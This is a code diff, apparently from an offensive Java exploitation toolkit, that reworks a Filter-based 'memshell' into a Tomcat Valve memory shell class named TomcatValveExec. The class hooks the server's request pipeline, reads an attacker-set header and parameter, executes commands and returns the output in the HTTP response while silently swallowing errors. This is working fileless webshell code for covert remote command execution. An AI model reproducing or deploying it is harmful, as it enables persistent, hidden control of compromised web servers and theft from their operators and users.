@@ -1,5 +1,6 @@
 package com.ppp.middleware.memshell;
 
+
 import com.ppp.annotation.JavaClassModifiable;
 import com.ppp.annotation.MemShell;
 import com.ppp.annotation.MemShellFunction;
@@ -9,35 +10,42 @@ import java.lang.reflect.Field;
 import java.lang.reflect.InvocationHandler;
 import java.lang.reflect.Method;
 
+
 /**
  * @author Whoopsunix
- * <p>
  */
-@MemShell(MemShell.Filter)
+@MemShell(MemShell.Valve)
 @MemShellFunction(MemShellFunction.Exec)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
-public class FilterExec implements InvocationHandler {
+public class TomcatValveExec implements InvocationHandler {
+
     private static String HEADER;
     private static String PARAM;
+    private Object targetObject;
+    private Object next;
 
-    public Object invoke(Object proxy, Method method, Object[] args) {
-        if (method.getName().equals("doFilter")) {
-            run(args[0], args[1], args[2]);
+    public TomcatValveExec() {
+    }
+
+    public TomcatValveExec(Object targetObject) {
+        this.targetObject = targetObject;
+    }
+
+    public Object invoke(Object proxy, Method method, Object[] args) throws Exception {
+        if (method.getName().equals("invoke")) {
+            run(args[0], args[1]);
+        } else if (method.getName().equals("getNext")) {
+            return next;
+        } else if (method.getName().equals("setNext")) {
+            next = args[0];
+        } else{
+            return method.invoke(getFieldValue(targetObject, "basic"), args);
         }
         return null;
     }
 
-//    public Object getResponse(Object httpServletRequest) throws Exception {
-//        return null;
-//    }
-//
-//    private void run(Object sre) {
-//    }
 
-    /**
-     * tomcat
-     */
-    private void run(Object servletRequest, Object servletResponse, Object filterChain) {
+    private void run(Object servletRequest, Object servletResponse) {
         try {
             Object header = invokeMethod(servletRequest, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
             Object param = invokeMethod(servletRequest, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
@@ -51,35 +59,9 @@ public class FilterExec implements InvocationHandler {
             invokeMethod(servletResponse, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
             Object writer = invokeMethod(servletResponse, "getWriter", new Class[]{}, new Object[]{});
             invokeMethod(writer, "println", new Class[]{String.class}, new Object[]{result});
-        } catch (Throwable e) {
-//            doFilter(servletRequest, servletResponse, filterChain);
+        } catch (Exception e) {
         }
-
-
     }
-
-//    // TODO 需要测试 jakarta
-//    public static void doFilter(Object servletRequest, Object servletResponse, Object filterChain){
-//        try{
-//            Class reqCls;
-//            Class repCls;
-//            try {
-//                reqCls = Class.forName("javax.servlet.ServletRequest");
-//                repCls = Class.forName("javax.servlet.ServletResponse");
-//            }catch (Exception e){
-//                reqCls = Class.forName("jakarta.servlet.ServletRequest");
-//                repCls = Class.forName("jakarta.servlet.ServletResponse");
-//            }
-//
-//            invokeMethod(filterChain.getClass(), filterChain, "doFilter", new Class[]{reqCls, repCls}, new Object[]{servletRequest, servletResponse});
-//        }catch (Throwable e){
-//
-//        }
-//    }
-
-//    public static String exec(String str) throws Exception {
-//        return (String) new javax.script.ScriptEngineManager().getEngineByName("js").eval(str);
-//    }
 
     public static String exec(String str) throws Exception {
         String[] cmd;
@@ -120,17 +102,13 @@ public class FilterExec implements InvocationHandler {
     }
 
     public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        Method method;
         try {
-            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
-        }catch (Exception e){
-            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
+        } catch (NoSuchMethodException e) {
+            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
         }
-    }
-
-    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
-        Object object = method.invoke(obj, args);
-        return object;
+        return method.invoke(obj, args);
     }
 }
